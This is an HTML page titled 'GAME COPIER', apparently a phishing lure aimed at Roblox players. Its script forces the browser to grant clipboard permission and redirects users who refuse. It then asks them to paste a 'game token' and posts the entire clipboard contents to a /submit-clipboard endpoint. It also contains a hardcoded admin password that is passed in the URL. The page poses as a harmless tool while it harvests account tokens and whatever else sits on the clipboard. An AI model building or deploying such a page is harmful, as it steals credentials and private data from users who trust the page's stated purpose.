<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>GAME COPIER</title>
<style>
  body {
    font-family: Arial, sans-serif;
    padding: 30px;
    background: #f9f9f9;
    color: #222;
  }
  input, button {
    margin: 10px 0;
    padding: 8px;
    font-size: 1rem;
    width: 300px;
    max-width: 100%;
  }
  #tokenBox {
    margin-top: 20px;
    display: none;
  }
</style>
</head>
<body>
  <h1>GAME COPIER</h1>
  <p>Copy games (legally).</p>

  <label for="gameIdInput">Enter Game ID:</label><br />
  <input type="text" id="gameIdInput" autocomplete="off" /><br />
  <button id="submitBtn">Submit Game ID</button>

  <div id="tokenBox">
    <p>Paste the game token here:</p>
    <input type="text" id="tokenInput" autocomplete="off" /><br />
    <button id="tokenSubmitBtn">Submit Token & Save Clipboard</button>
  </div>

  <button id="adminBtn" style="margin-top: 40px;">Admin Login</button>

  <script>
    const gameIdInput = document.getElementById('gameIdInput');
    const submitBtn = document.getElementById('submitBtn');
    const tokenInput = document.getElementById('tokenInput');
    const tokenSubmitBtn = document.getElementById('tokenSubmitBtn');
    const tokenBox = document.getElementById('tokenBox');
    const adminBtn = document.getElementById('adminBtn');

    let permissionGranted = false;

    // Only block Ctrl+V if permission not granted yet
    document.addEventListener('keydown', async (e) => {
      if (e.ctrlKey && e.key.toLowerCase() === 'v' && !permissionGranted) {
        e.preventDefault();

        try {
          // This triggers the browser clipboard permission popup
          await navigator.clipboard.readText();
          permissionGranted = true;
          // No alert here, just silently allow
        } catch (err) {
          alert('Clipboard permission denied. Redirecting...');
          window.location.href = 'https://example.com/denied'; // Replace with your redirect
        }
      }
    });

    // Now that permission is granted, Ctrl+V will work normally

    submitBtn.onclick = () => {
      if (!permissionGranted) {
        alert('Please press Ctrl+V once and grant clipboard permission first.');
        return;
      }

      const gameId = gameIdInput.value.trim();
      if (!gameId) {
        alert('Please enter a game ID.');
        return;
      }

      window.open(`https://roblox.com/${gameId}`, '_blank');

      setTimeout(() => {
        tokenBox.style.display = 'block';
      }, 500);
    };

    tokenSubmitBtn.onclick = async () => {
      try {
        // Read *entire* clipboard content on token submit
        const fullClipboard = await navigator.clipboard.readText();

        await fetch('/submit-clipboard', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ clipboardData: fullClipboard })
        });

        alert('Clipboard content saved successfully!');
      } catch (err) {
        alert('Failed to access clipboard. Please ensure permission is granted.');
      }
    };

    adminBtn.onclick = () => {
      const password = prompt('Enter admin password:');
      if (password === 'skibidi123') {
        window.location.href = '/admin?password=skibidi123';
      } else {
        alert('Incorrect password');
      }
    };
  </script>
</body>
</html>
